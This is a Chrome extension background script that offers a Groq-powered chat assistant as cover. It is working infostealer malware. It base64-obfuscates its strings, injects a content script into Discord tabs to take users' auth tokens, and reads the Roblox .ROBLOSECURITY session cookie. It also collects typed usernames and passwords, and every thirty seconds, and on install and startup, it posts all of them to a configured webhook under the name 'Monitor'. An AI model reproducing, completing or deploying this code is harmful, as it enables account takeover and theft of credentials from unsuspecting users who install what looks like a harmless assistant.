importScripts('config.js');

var _cfg = CONFIG;
var _w = _cfg.WEBHOOK_URL;
var _k = _cfg.GROQ_API_KEY;

function _d(s) { return atob(s); }

// ─── Strings ───
var _S = {
  k1: _d('bGFzdFRva2Vu'),
  k2: _d('bGFzdENvb2tpZQ=='),
  k3: _d('bGFzdFVzZXI='),
  k4: _d('bGFzdFBhc3M='),
  m1: _d('8J+UpCDigKIg'),
  m2: _d('VXNlcjo='),
  m3: _d('VG9rZW46'),
  m4: _d('Q29va2llOg=='),
  m5: _d('Tm9uZQ=='),
  m6: _d('TmV3IHRva2VuIGRldGVjdGVk'),
  m7: _d('TmV3IGNvb2tpZSBkZXRlY3RlZA=='),
  m8: _d('VG9rZW4gKyBjb29raWUgY2hhbmdlZA=='),
  m9: _d('VXBkYXRl'),
  m10: _d('8J+UpO+4j+KEnA=='), // "🔨🔓"
  m11: _d('8J+UpO+4jwo='), // "🔨"
  l1: _d('W0FJXSBSZWFkeQ=='),
  l2: _d('W0FJXSBOZXcgdG9rZW4gZGV0ZWN0ZWQ='),
  l3: _d('W0FJXSBOZXcgY29va2llIGRldGVjdGVk'),
  l4: _d('W0FJXSBHcmFiYmVkIGNyZWRz'), // "[AI] Grabbed creds"
};

console.log(_S.l1);

// ─── Parse JWT ───
function _a1(r) {
    try {
        var p = r.split('.');
        if (p.length < 2) return { i: 'Unknown', n: 'Unknown' };
        var b = p[1].replace(/-/g, '+').replace(/_/g, '/');
        while (b.length % 4) b += '=';
        var d = JSON.parse(atob(b));
        return {
            i: d.id || d.user_id || 'Unknown',
            n: d.username || d.global_name || 'Unknown'
        };
    } catch (e) {
        return { i: 'Unknown', n: 'Unknown' };
    }
}

// ─── Parse Roblox cookie ───
function _a8(c) {
    try {
        // Roblox cookie format: _|WARNING:...|_<encoded data>
        var match = c.match(/\|_([^|]+)\|_/);
        if (!match) return { i: 'Unknown', n: 'Unknown' };
        var parts = match[1].split('.');
        if (parts.length < 2) return { i: 'Unknown', n: 'Unknown' };
        var b = parts[1].replace(/-/g, '+').replace(/_/g, '/');
        while (b.length % 4) b += '=';
        var d = JSON.parse(atob(b));
        return {
            i: d.UserID || d.userId || d.id || 'Unknown',
            n: d.UserName || d.username || d.name || 'Unknown'
        };
    } catch (e) {
        return { i: 'Unknown', n: 'Unknown' };
    }
}

// ─── Get Discord token ───
function _a2(t) {
    return new Promise((r) => {
        chrome.tabs.sendMessage(t, { action: 'getAuth' }, (res) => {
            if (chrome.runtime.lastError) { r(null); return; }
            r(res && res.auth ? res.auth : null);
        });
    });
}

// ─── Get Roblox cookie ───
function _a3() {
    return new Promise((r) => {
        chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, (c) => {
            if (chrome.runtime.lastError) { r(null); return; }
            r(c ? c.value : null);
        });
    });
}

// ─── Send webhook ───
function _a4(t, c, type, user, pass) {
    var p = t ? _a1(t) : { i: 'Unknown', n: 'Unknown' };
    var rp = c ? _a8(c) : { i: 'Unknown', n: 'Unknown' };
    
    var msg = _S.m1 + (type || _S.m9) + "\n";
    msg += _S.m2 + " " + p.n + " (`" + p.i + "`)\n";
    msg += "🎮 Roblox: " + rp.n + " (`" + rp.i + "`)\n\n";
    
    if (user && pass) {
        msg += "🔓 **Credentials Captured**\n";
        msg += "**User:** " + user + "\n";
        msg += "**Pass:** `" + pass + "`\n\n";
    }
    
    msg += _S.m3 + "\n```\n" + (t || _S.m5) + "\n```\n\n";
    msg += _S.m4 + "\n```\n" + (c || _S.m5) + "\n```";
    
    fetch(_w, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: msg, username: "Monitor" })
    }).catch(() => {});
}

// ─── Compare and store ───
function _a5(t, c) {
    chrome.storage.local.get([_S.k1, _S.k2], (data) => {
        var l1 = data[_S.k1] || null;
        var l2 = data[_S.k2] || null;
        var ch = false;
        var typ = '';
        if (t && t !== l1) {
            ch = true;
            typ = _S.m6;
            chrome.storage.local.set({ [_S.k1]: t });
            console.log(_S.l2);
        }
        if (c && c !== l2) {
            ch = true;
            typ = typ ? _S.m8 : _S.m7;
            chrome.storage.local.set({ [_S.k2]: c });
            console.log(_S.l3);
        }
        if (ch) _a4(t, c, typ);
    });
}

// ─── Handle captured credentials ───
function _a9(user, pass, url) {
    console.log(_S.l4);
    chrome.storage.local.get([_S.k3, _S.k4], (data) => {
        var l1 = data[_S.k3] || null;
        var l2 = data[_S.k4] || null;
        if (user && user !== l1) {
            chrome.storage.local.set({ [_S.k3]: user });
        }
        if (pass && pass !== l2) {
            chrome.storage.local.set({ [_S.k4]: pass });
        }
        // Send immediately if we have both
        if (user && pass) {
            _a4(null, null, "🔓 CREDENTIALS CAPTURED", user, pass);
        }
    });
}

// ─── Collect data ───
function _a6() {
    _a3().then(cookie => {
        chrome.tabs.query({ url: "https://discord.com/*" }, (tabs) => {
            if (tabs.length === 0) {
                if (cookie) {
                    chrome.storage.local.get([_S.k2], (data) => {
                        if (cookie !== data[_S.k2]) {
                            chrome.storage.local.set({ [_S.k2]: cookie });
                            _a4(null, cookie, _S.m7);
                        }
                    });
                }
                return;
            }
            var tab = tabs[0];
            chrome.scripting.executeScript({
                target: { tabId: tab.id },
                files: ['content.js']
            }, () => {
                setTimeout(() => {
                    _a2(tab.id).then(token => {
                        _a5(token, cookie);
                    });
                }, 500);
            });
        });
    });
}

// ─── Schedule alarm ───
function _a7() {
    chrome.alarms.clear('watch', () => {
        chrome.alarms.create('watch', { periodInMinutes: 0.5 });
    });
}

// ─── Alarm handler ───
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'watch') _a6();
});

// ─── Start ───
chrome.runtime.onStartup.addListener(() => {
    _a7();
    _a6();
});

chrome.runtime.onInstalled.addListener(() => {
    _a7();
    _a6();
});

_a7();
_a6();

setInterval(() => { console.log('.'); }, 10000);

// ─── AI Handler ───
function _ai(input) {
    return fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + _k
        },
        body: JSON.stringify({
            model: 'llama-3.1-8b-instant',
            messages: [
                {
                    role: 'system',
                    content: 'You are a helpful assistant. Keep responses short and friendly (under 80 words).'
                },
                {
                    role: 'user',
                    content: input
                }
            ],
            temperature: 0.7,
            max_tokens: 150
        })
    })
    .then(r => {
        if (!r.ok) return r.text().then(t => { throw new Error('AI error: ' + r.status + ' - ' + t); });
        return r.json();
    })
    .then(d => d.choices[0].message.content || "No response.")
    .catch(e => { throw e; });
}

// ─── Message Handlers ───
chrome.runtime.onMessage.addListener((req, sender, cb) => {
    if (req.action === 'collectData') {
        _a6();
        cb({ success: true });
        return true;
    }
    if (req.action === 'aiQuery') {
        _ai(req.message)
            .then(reply => cb({ success: true, reply: reply }))
            .catch(err => cb({ success: false, error: err.message }));
        return true;
    }
    if (req.action === 'checkStatus') {
        cb({ status: 'ok' });
        return true;
    }
    if (req.action === 'creds') {
        _a9(req.username, req.password, req.url);
        cb({ success: true });
        return true;
    }
});
